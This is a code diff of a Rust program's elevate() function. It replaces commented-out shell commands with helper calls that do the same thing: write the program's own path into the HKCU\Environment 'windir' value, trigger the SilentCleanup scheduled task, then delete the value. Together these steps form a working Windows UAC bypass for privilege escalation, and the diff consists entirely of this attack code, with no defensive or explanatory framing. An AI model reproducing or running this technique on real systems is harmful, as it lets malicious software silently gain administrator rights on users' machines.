@@ -15,44 +15,12 @@ fn main() {
 
 fn elevate() {
   println!("[+] Elevating...");
-  // Add
-  // Command::new("cmd")
-  //   .args(&[
-  //     "/C",
-  //     &*format!(
-  //       "REG ADD HKCU\\Environment /v windir /d \"{}\"",
-  //       std::env::current_exe().unwrap().to_str().unwrap()
-  //     ),
-  //     "/f",
-  //   ])
-  //   .output()
-  //   .unwrap();
+  // Add the "windir" registry key
   registry::set_windir();
 
-  // Run
-  // Command::new("schtasks.exe")
-  //   .args(&[
-  //     "/Run",
-  //     "/TN",
-  //     r"\Microsoft\Windows\DiskCleanup\SilentCleanup",
-  //     "/I",
-  //   ])
-  //   .output()
-  //   .unwrap();
+  // Run the SilentCleanup task
   schtasks::run_silent_cleanup_task();
 
-  // Delete
-  // Command::new("cmd")
-  //   .args(&[
-  //     "/C",
-  //     "REG",
-  //     "DELETE",
-  //     r"HKCU\Environment",
-  //     "/v",
-  //     "windir",
-  //     "/f",
-  //   ])
-  //   .output()
-  //   .unwrap();
+  // Delete the "windir" registry key
   registry::delete_windir();
 }
